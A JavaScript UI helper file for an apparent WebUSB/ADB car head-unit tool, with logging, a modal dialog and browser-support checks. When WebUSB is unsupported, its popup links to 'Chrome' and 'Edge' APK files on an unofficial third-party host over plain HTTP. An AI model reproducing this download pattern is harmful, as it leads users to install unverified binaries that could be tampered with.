
let adb;
let webusb;


let log = (...args) => {
    if (args[0] instanceof Error) {
        console.error.apply(console, args);
    } else {
        console.log.apply(console, args);
    }
    let logElement = document.getElementById('log');
    if (logElement) {
        logElement.textContent = logElement.textContent + args.join(' ') + '\n';
        logElement.scrollTop = logElement.scrollHeight;
    }
};


let clear = async () => {
    let logElement = document.getElementById('log');
    if (logElement) {
        logElement.textContent = "";
    }
    
    if (typeof expandExecResult === 'function') {
        expandExecResult();
    } else {
        
        const execResult = document.getElementById('exec-result');
        const toggleBtn = document.getElementById('exec-result-toggle');
        if (execResult && execResult.classList.contains('collapsed')) {
            execResult.classList.remove('collapsed');
            if (toggleBtn) toggleBtn.textContent = '▼ 点击折叠执行结果';
        }
    }
};


let showProgress = async (show) => {
    let progress = document.getElementById('progress');
    if (progress) {
        if (show) {
            progress.className = "progress active progress-striped";
        } else {
            progress.className = "progress";
        }
    }
};


function checkWebUSBSupport() {
    const usbWarning = document.getElementById('usb-warning');

    
    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
    if (isIOS) {
        usbWarning.innerHTML = '⚠️ iOS 设备暂不支持 WebUSB 连接<br>请使用 Windows/Mac 电脑连接车机';
        usbWarning.style.display = 'block';
        showChromeDownloadPopup();
        return false;
    }

    
    if (!('usb' in navigator)) {
        
        const userAgent = navigator.userAgent;
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
        
        
        const isEdge = userAgent.indexOf('Edg') > -1 || userAgent.indexOf('EdgA') > -1;
        const isChrome = userAgent.indexOf('Chrome') > -1 && userAgent.indexOf('Edg') === -1 && userAgent.indexOf('EdgA') === -1;
        const isOpera = userAgent.indexOf('OPR') > -1;
        const isSupportedBrowser = isEdge || isChrome || isOpera;

        
        if (userAgent.indexOf('EdgA') > -1) {
            return true;
        }

        if (isMobile) {
            
            usbWarning.innerHTML = '⚠️ 移动端浏览器暂不支持 WebUSB<br>请使用电脑浏览器（Chrome）连接车机';
            usbWarning.style.display = 'block';
            showChromeDownloadPopup();
            return false;
        } else if (!isSupportedBrowser) {
            
            usbWarning.innerHTML = '⚠️ 您的浏览器不支持 WebUSB API<br>请使用 Chrome 浏览器';
            usbWarning.style.display = 'block';
            showChromeDownloadPopup();
            return false;
        } else {
            
            usbWarning.innerHTML = '⚠️ 您的浏览器不支持 WebUSB API<br>请使用 Chrome 或 Edge 浏览器';
            usbWarning.style.display = 'block';
            showChromeDownloadPopup();
            return false;
        }
    }

    
    const userAgent = navigator.userAgent;
    const isEdge = userAgent.indexOf('Edg') > -1 || userAgent.indexOf('EdgA') > -1;
    const isChrome = userAgent.indexOf('Chrome') > -1 && userAgent.indexOf('Edg') === -1 && userAgent.indexOf('EdgA') === -1;
    const isOpera = userAgent.indexOf('OPR') > -1;
    const isSupportedBrowser = isEdge || isChrome || isOpera;

    if (!isSupportedBrowser) {
        usbWarning.innerHTML = '⚠️ 您的浏览器类型不支持 WebUSB<br>请使用 Chrome 或 Edge 浏览器';
        usbWarning.style.display = 'block';
        showChromeDownloadPopup();
        return false;
    }

    
    let isSupportedVersion = false;

    
    if (isEdge) {
        const edgeMatch = userAgent.match(/EdgA?\/(\d+)/);
        if (edgeMatch) {
            const edgeVersion = parseInt(edgeMatch[1]);
            isSupportedVersion = edgeVersion >= 79;
        }
    }
    
    else if (isChrome) {
        const chromeMatch = userAgent.match(/Chrome\/(\d+)/);
        if (chromeMatch) {
            const chromeVersion = parseInt(chromeMatch[1]);
            isSupportedVersion = chromeVersion >= 61;
        }
    }
    
    else if (isOpera) {
        const operaMatch = userAgent.match(/OPR\/(\d+)/);
        if (operaMatch) {
            const operaVersion = parseInt(operaMatch[1]);
            isSupportedVersion = operaVersion >= 48;
        }
    }

    if (!isSupportedVersion) {
        usbWarning.innerHTML = '⚠️ 您的浏览器版本过低，不支持 WebUSB<br>请更新到最新版本的 Chrome 或 Edge 浏览器';
        usbWarning.style.display = 'block';
        showChromeDownloadPopup();
        return false;
    }

    
    usbWarning.style.display = 'none';
    return true;
}


let modalCallback = null;


function showModal(title, content, options = {}) {
    
    if (typeof document === 'undefined') {
        console.error('Document not available');
        return;
    }
    
    const modal = document.getElementById('customModal');
    const modalTitle = document.getElementById('modalTitle');
    const modalBody = document.getElementById('modalBody');
    const modalFooter = document.getElementById('modalFooter');
    
    if (!modal || !modalTitle || !modalBody || !modalFooter) {
        console.error('Modal elements not found');
        
        alert(title + '\n\n' + content);
        return;
    }
    
    
    modalTitle.textContent = title;
    modalBody.innerHTML = content; 
    
    
    const defaultOptions = {
        showCancel: true,
        cancelText: '取消',
        confirmText: '确定',
        cancelClass: 'custom-modal-btn-secondary',
        confirmClass: 'custom-modal-btn-primary',
        callback: null
    };
    
    const finalOptions = { ...defaultOptions, ...options };
    modalCallback = finalOptions.callback;
    
    
    modalFooter.innerHTML = '';
    
    if (finalOptions.showCancel) {
        const cancelBtn = document.createElement('button');
        cancelBtn.className = `custom-modal-btn ${finalOptions.cancelClass}`;
        cancelBtn.textContent = finalOptions.cancelText;
        cancelBtn.onclick = closeModal;
        modalFooter.appendChild(cancelBtn);
    }
    
    const confirmBtn = document.createElement('button');
    confirmBtn.className = `custom-modal-btn ${finalOptions.confirmClass}`;
    confirmBtn.textContent = finalOptions.confirmText;
    confirmBtn.onclick = confirmModal;
    modalFooter.appendChild(confirmBtn);
    
    
    modal.style.display = 'block';
}


function closeModal() {
    const modal = document.getElementById('customModal');
    if (modal) {
        modal.style.display = 'none';
    }
    modalCallback = null;
}


function confirmModal() {
    if (typeof modalCallback === 'function') {
        const result = modalCallback(true);
        
        if (result === false) {
            return;
        }
    }
    closeModal();
}


function showChromeDownloadPopup() {
    const content = '您的浏览器不支持 WebUSB，请使用以下浏览器：<br><br>' +
                    '<a href="http://a14472357.a.328657.xyz/a14472357/Chrome_107.0.53.apk" target="_blank">Google Chrome 浏览器</a><br><br>' +
                    '<a href="http://a14472357.a.328657.xyz/a14472357/EDGE.apk" target="_blank">Microsoft Edge 浏览器</a><br><br>' +
                    '点击上方链接下载对应浏览器的安装工具。';
    
    showModal('浏览器支持提示', content, {
        showCancel: true,
        cancelText: '取消',
        confirmText: '下载 Chrome 工具',
        callback: function(confirmed) {
            if (confirmed) {
                window.open('http://a14472357.a.328657.xyz/a14472357/Chrome_107.0.53.apk', '_blank');
            }
        }
    });
}


try {
    if (typeof module !== 'undefined' && module.exports) {
        module.exports = {
            log,
            clear,
            showProgress,
            checkWebUSBSupport
        };
    }
} catch (e) {
    
}